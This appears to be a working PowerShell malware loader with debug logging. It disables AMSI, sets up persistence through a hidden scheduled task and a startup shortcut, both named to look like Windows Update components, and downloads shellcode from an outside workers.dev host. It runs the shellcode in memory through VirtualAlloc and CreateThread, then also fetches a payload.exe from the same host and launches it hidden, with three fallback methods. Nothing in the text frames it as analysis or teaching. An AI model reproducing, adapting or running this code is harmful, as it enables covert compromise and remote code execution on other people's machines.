# === DEBUG LOGGING SETUP ===
function Write-DebugLog {
    param([string]$Message)
    try {
        "$Message" | Out-File "C:\Users\Public\debug.txt" -Append
    } catch {}
}

"launcher.ps1 started" | Out-File "C:\Users\Public\debug.txt" -Append

try {
    # === SETUP ===
    $envData = Get-Item env:APPDATA
    $cachePath = Join-Path $envData.Value "Microsoft\Windows\Caches"
    if(!(Test-Path $cachePath)){New-Item -Path $cachePath -ItemType Directory -Force | Out-Null}
    
    # === AMSI BYPASS ===
    try {
        Write-DebugLog "Attempting AMSI bypass"
        $amsiContext = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
        $amsiContext.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
        Write-DebugLog "AMSI bypass successful"
    } catch {
        Write-DebugLog "AMSI bypass failed: $($_.Exception.Message)"
    }
    
    # === PERSISTENCE: Scheduled Task ===
    try {
        $taskName = "WindowsUpdateTask"
        $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if (-not $taskExists) {
            Write-DebugLog "Creating scheduled task"
            $trigger = New-ScheduledTaskTrigger -AtLogOn
            $scriptPath = Join-Path $cachePath "launcher.ps1"
            $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""))
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-EncodedCommand $encodedCommand"
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 1)
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
            Write-DebugLog "Scheduled task created successfully"
        } else {
            Write-DebugLog "Scheduled task already exists"
        }
    } catch {
        Write-DebugLog "Failed to create scheduled task: $($_.Exception.Message)"
    }
    
    # === PERSISTENCE: Startup LNK ===
    try {
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
        if (-not (Test-Path $lnkPath)) {
            Write-DebugLog "Creating startup shortcut"
            $wshShell = New-Object -ComObject WScript.Shell
            $shortcut = $wshShell.CreateShortcut($lnkPath)
            $scriptPath = Join-Path $cachePath "launcher.ps1"
            $shortcut.TargetPath = "powershell.exe"
            $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
            $shortcut.WindowStyle = 7
            $shortcut.Save()
            Write-DebugLog "Startup shortcut created successfully"
        } else {
            Write-DebugLog "Startup shortcut already exists"
        }
    } catch {
        Write-DebugLog "Failed to create startup shortcut: $($_.Exception.Message)"
    }
    
    # === DOWNLOAD SHELLCODE ===
    $shellcodeUrl = "https://aged-mountain-614b.natalia-kush82.workers.dev/calc.bin"
    $shellcodePath = Join-Path $cachePath "payload.bin"
    
    Write-DebugLog "Downloading shellcode from: $shellcodeUrl"
    
    $retryCount = 0
    $maxRetries = 5
    $downloadSuccess = $false
    
    do {
        try {
            $retryCount++
            Write-DebugLog "Download attempt $retryCount of $maxRetries"
            Invoke-WebRequest -Uri $shellcodeUrl -OutFile $shellcodePath -TimeoutSec 300 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
            $downloadSuccess = $true
            Write-DebugLog "Shellcode download successful on attempt $retryCount"
            break
        } catch {
            Write-DebugLog "Download attempt $retryCount failed: $($_.Exception.Message)"
            if ($retryCount -lt $maxRetries) {
                Write-DebugLog "Waiting 10 seconds before retry..."
                Start-Sleep -Seconds 10
            }
        }
    } while ($retryCount -lt $maxRetries -and -not $downloadSuccess)
    
    if (-not $downloadSuccess) {
        Write-DebugLog "All download attempts failed, proceeding to EXE fallback"
    }
    
    # === VERIFY DOWNLOAD ===
    if (Test-Path $shellcodePath) {
        $fileSize = (Get-Item $shellcodePath).Length
        Write-DebugLog "Download OK - File size: $fileSize bytes"
        
        # === INJECT SHELLCODE ===
        try {
            Write-DebugLog "Starting shellcode injection"
            
            # Native methods for injection
            Write-DebugLog "Loading NativeMethods type definition"
            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
}
"@
            Write-DebugLog "NativeMethods type loaded successfully"
            
            $shellcodeBytes = [System.IO.File]::ReadAllBytes($shellcodePath)
            Write-DebugLog "Shellcode loaded: $($shellcodeBytes.Length) bytes"
            
            # Allocate memory with PAGE_EXECUTE_READWRITE
            Write-DebugLog "Calling VirtualAlloc with PAGE_EXECUTE_READWRITE"
            $memAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, [UInt32]$shellcodeBytes.Length, 0x3000, 0x40)
            $win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-DebugLog "VirtualAlloc result: 0x$($memAddress.ToString('X16')), Win32 error: $win32Error"
            
            if ($memAddress -eq [IntPtr]::Zero) {
                Write-DebugLog "ERROR: VirtualAlloc failed with Win32 error: $win32Error"
                throw "VirtualAlloc failed"
            }
            Write-DebugLog "Memory allocated successfully at: 0x$($memAddress.ToString('X16'))"
            
            # Copy shellcode
            [System.Runtime.InteropServices.Marshal]::Copy($shellcodeBytes, 0, $memAddress, $shellcodeBytes.Length)
            Write-DebugLog "Shellcode copied to memory"
            
            # Create thread
            $threadId = 0
            Write-DebugLog "Calling CreateThread to execute shellcode"
            $threadHandle = [NativeMethods]::CreateThread(0, 0, $memAddress, [IntPtr]::Zero, 0, [Ref]$threadId)
            $win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-DebugLog "CreateThread result: 0x$($threadHandle.ToString('X16')), Thread ID: $threadId, Win32 error: $win32Error"
            
            if ($threadHandle -eq [IntPtr]::Zero) {
                Write-DebugLog "ERROR: CreateThread failed with Win32 error: $win32Error"
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($memAddress)
                throw "CreateThread failed"
            }
            Write-DebugLog "Thread created successfully with ID: $threadId"
            Write-DebugLog "Shellcode execution initiated"
            
        } catch {
            Write-DebugLog "Shellcode injection failed: $($_.Exception.Message)"
        }
    } else {
        Write-DebugLog "ERROR: Shellcode file not found after download"
    }
    
    # === EXE FALLBACK (ALWAYS ATTEMPTED) ===
    try {
        Write-DebugLog "Attempting EXE fallback"
        $exeUrl = "https://aged-mountain-614b.natalia-kush82.workers.dev/payload.exe"
        $exePath = Join-Path $cachePath "helper.exe"
        
        Write-DebugLog "Downloading EXE from: $exeUrl"
        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -TimeoutSec 300 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
        
        if (Test-Path $exePath) {
            $exeSize = (Get-Item $exePath).Length
            Write-DebugLog "EXE downloaded successfully: $exeSize bytes"
            
            # Try multiple execution methods
            try {
                Write-DebugLog "Attempting EXE execution via WMI"
                Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
                Write-DebugLog "EXE executed via WMI successfully"
            } catch {
                try { 
                    Write-DebugLog "WMI failed, attempting via WScript.Shell"
                    (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) 
                    Write-DebugLog "EXE executed via WScript.Shell successfully"
                } catch { 
                    Write-DebugLog "WScript.Shell failed, attempting via Start-Process"
                    Start-Process $exePath -WindowStyle Hidden
                    Write-DebugLog "EXE executed via Start-Process successfully"
                }
            }
        } else {
            Write-DebugLog "ERROR: EXE file not found after download"
        }
    } catch {
        Write-DebugLog "EXE fallback failed: $($_.Exception.Message)"
    }
    
} catch {
    Write-DebugLog "Critical error: $($_.Exception.Message)"
}

# === FINAL LOG ===
Write-DebugLog "launcher.ps1 finished"
